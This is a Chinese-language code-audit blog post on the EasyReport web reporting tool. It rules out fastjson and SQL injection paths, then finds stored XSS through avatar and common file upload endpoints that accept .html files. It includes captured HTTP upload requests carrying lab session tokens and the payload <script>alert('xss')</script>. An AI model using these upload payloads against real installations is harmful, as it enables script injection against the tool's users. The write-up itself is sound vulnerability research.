---
title: EasyReport
description: GitHub地址-https://github.com/zwdgit/EasyReport
date: 2025-01-04
image: cover.png
categories:
    - cate2
tags:
    - Code Audit
---


## 介绍

​	EasyReport 是一款比较简单的在线 Web 报表工具，也算是一个种子项目，本身是基于[若依](http://ruoyi.vip/)的前后端分离版本（SpringBoot + Vue）开发的，核心功能就是通过配置数据源和查询 SQL 来动态配置和生成报表（Table），并且可以针对不用的角色或者用户来配置各自的报表查看权限。

## 项目依赖审计

​	通过工具扫描发现该项目启用了fastjson，项目中也存在将JSON字符串解析为Java对象的情况，但是并未被控制器调用无法利用，所以这里跳过。

## 单点漏洞审计

### SQL

​	该项目的数据库交互方式为mybatis，所以直接在mapper文件中寻找$。逐一排查后，在以下四个文件中找到了可疑注入点。

![image-20241230093350694](/image-20241230093350694.png)

​	其中src/main/resources/mapper/ReportMapper.xml无法正常使用，所以这里直接跳过。

#### src/main/resources/mapper/system/SysDeptMapper.xml（失败）

```xml
    <select id="selectDeptList" parameterType="SysDept" resultMap="SysDeptResult">
        <include refid="selectDeptVo"/>
        where d.del_flag = '0'
        <if test="deptId != null and deptId != 0">
            AND dept_id = #{deptId}
        </if>
        <if test="parentId != null and parentId != 0">
            AND parent_id = #{parentId}
        </if>
        <if test="deptName != null and deptName != ''">
            AND dept_name like concat('%', #{deptName}, '%')
        </if>
        <if test="status != null and status != ''">
            AND status = #{status}
        </if>
        <!-- 数据范围过滤 -->
        ${params.dataScope}
        order by d.parent_id, d.order_num
    </select>
```

​	向上追溯后审计并测试后发现，params.dataScope会在传入时被删除，所以这里Scope是一个无用的参数，在后续的所有XML文件中都是相同的语句和参数，所以直接跳过。

### 文件上传

​	我们通过前端的头像上传定位到头像上传控制器。

#### src/main/java/com/sdyx/web/controller/system/SysProfileController.java（成功）

```java
    @Log(title = "用户头像", businessType = BusinessType.UPDATE)
    @PostMapping("/avatar")
    public AjaxResult avatar(@RequestParam("avatarfile") MultipartFile file) throws IOException {
        if (!file.isEmpty()) {
            LoginUser loginUser = getLoginUser();
            String avatar = FileUploadUtils.upload(EasyReportConfig.getAvatarPath(), file);
            if (userService.updateUserAvatar(loginUser.getUsername(), avatar)) {
                AjaxResult ajax = AjaxResult.success();
                ajax.put("imgUrl", avatar);
                // 更新缓存用户头像
                loginUser.getUser().setAvatar(avatar);
                tokenService.setLoginUser(loginUser);
                return ajax;
            }
        }
        return AjaxResult.error("上传图片异常，请联系管理员");
    }
```

​	跟踪upload方法，我们来到文件上传的校验环节。在src/main/java/com/sdyx/common/utils/file/MimeTypeUtils.java中找到了允许的后缀。

```java
    public static final String[] DEFAULT_ALLOWED_EXTENSION = {
            // 图片
            "bmp", "gif", "jpg", "jpeg", "png",
            // word excel powerpoint
            "doc", "docx", "xls", "xlsx", "ppt", "pptx", "html", "htm", "txt",
            // 压缩文件
            "rar", "zip", "gz", "bz2",
            // 视频格式
            "mp4", "avi", "rmvb",
            // pdf
            "pdf"};
```

​	这个字符串数组定义的是可上传的后缀，同时在原文件中还限制了文件名的长度不能大于100。可见这里允许了html文件，所以这里理论上是存在一个存储型XSS的。

```java
    public static final String extractFilename(MultipartFile file) {
        String fileName = file.getOriginalFilename();
        String extension = getExtension(file);
        fileName = DateUtils.datePath() + "/" + IdUtils.fastUUID() + "." + extension;
        return fileName;
    }
```

​	这里对文件名进行修改，所以这里是不存在目录穿透的。最后经过审计我们可知，该文件上传功能点存在一个存储型XSS。我们回到前端进行测试。

​	随便上传一个图片后抓包，抓得如下数据包：

```http
POST /dev-api/system/user/profile/avatar HTTP/1.1
Host: 172.24.90.8:8000
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjZkNDhiMmMzLThlMDgtNDAzZi1iNzk0LWQxYWViMDQwZGZlMSJ9.t_SOgu7h_e2mjaTUA-OLw8neXClK1TjAwsg15ZBHB1St5oE2gbKgkyxcBxzqiOlkKg44-rw-ERn_iKOvdLTPYA
Origin: http://172.24.90.8:8000
Referer: http://172.24.90.8:8000/user/profile
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: username=admin; password=da+wRqhdcPVb8lT9ZGqw8QLuMvePnL/qj/rU31B9A381haug92QdObElWCPobmyoDiET/jj9mCCGTGSSL+jeZQ==; rememberMe=true; Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjZkNDhiMmMzLThlMDgtNDAzZi1iNzk0LWQxYWViMDQwZGZlMSJ9.t_SOgu7h_e2mjaTUA-OLw8neXClK1TjAwsg15ZBHB1St5oE2gbKgkyxcBxzqiOlkKg44-rw-ERn_iKOvdLTPYA
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykFiiAB8b31Yj58Jb
Content-Length: 146895

------WebKitFormBoundarykFiiAB8b31Yj58Jb
Content-Disposition: form-data; name="avatarfile"; filename="blob"
Content-Type: image/jpeg

{{unquote("...原文件内容省略...")}}
------WebKitFormBoundarykFiiAB8b31Yj58Jb--

```

​	我们在文件内容中插入XSSpayload:

```html
<script>alert('xss')</script>
```

​	在修改后缀为html。

​	![image-20250104123626239](/image-20250104123626239.png)

​	发送后访问返回包中的url即可触发XSS攻击。

![image-20250104123712557](/image-20250104123712557.png)

#### src/main/java/com/sdyx/web/controller/common/CommonController.java（成功）

​	在审计头像上传过程中我们发现还有一处控制器调用了文件上传的实现代码，所以我们来到这个通用上传控制器。

```java
    @PostMapping("/common/upload")
    public AjaxResult uploadFile(MultipartFile file) throws Exception {
        try {
            // 上传文件路径
            String filePath = EasyReportConfig.getUploadPath();
            // 上传并返回新文件名称
            String fileName = FileUploadUtils.upload(filePath, file);
            String url = serverConfig.getUrl() + fileName;
            AjaxResult ajax = AjaxResult.success();
            ajax.put("fileName", fileName);
            ajax.put("url", url);
            return ajax;
        } catch (Exception e) {
            return AjaxResult.error(e.getMessage());
        }
    }
```

​	我们构造如下数据包，即可调用upload方法。

```http
POST /dev-api/common/upload HTTP/1.1
Host: 172.24.90.8:8000
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjZkNDhiMmMzLThlMDgtNDAzZi1iNzk0LWQxYWViMDQwZGZlMSJ9.t_SOgu7h_e2mjaTUA-OLw8neXClK1TjAwsg15ZBHB1St5oE2gbKgkyxcBxzqiOlkKg44-rw-ERn_iKOvdLTPYA
Origin: http://172.24.90.8:8000
Referer: http://172.24.90.8:8000/user/profile
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: username=admin; password=da+wRqhdcPVb8lT9ZGqw8QLuMvePnL/qj/rU31B9A381haug92QdObElWCPobmyoDiET/jj9mCCGTGSSL+jeZQ==; rememberMe=true; Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjZkNDhiMmMzLThlMDgtNDAzZi1iNzk0LWQxYWViMDQwZGZlMSJ9.t_SOgu7h_e2mjaTUA-OLw8neXClK1TjAwsg15ZBHB1St5oE2gbKgkyxcBxzqiOlkKg44-rw-ERn_iKOvdLTPYA
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykFiiAB8b31Yj58Jb
Content-Length: 146895

------WebKitFormBoundarykFiiAB8b31Yj58Jb
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: image/jpeg

...此处插入文件内容...
------WebKitFormBoundarykFiiAB8b31Yj58Jb--

```

​	这里没什么好说的，和上一个同样的漏洞， 在文件内容处插入XSSpayload并修改文件后缀为html：

```html
<script>alert('xss')</script>
```

​	![image-20250104125405239](/image-20250104125405239.png)

​	访问返回的URL即可。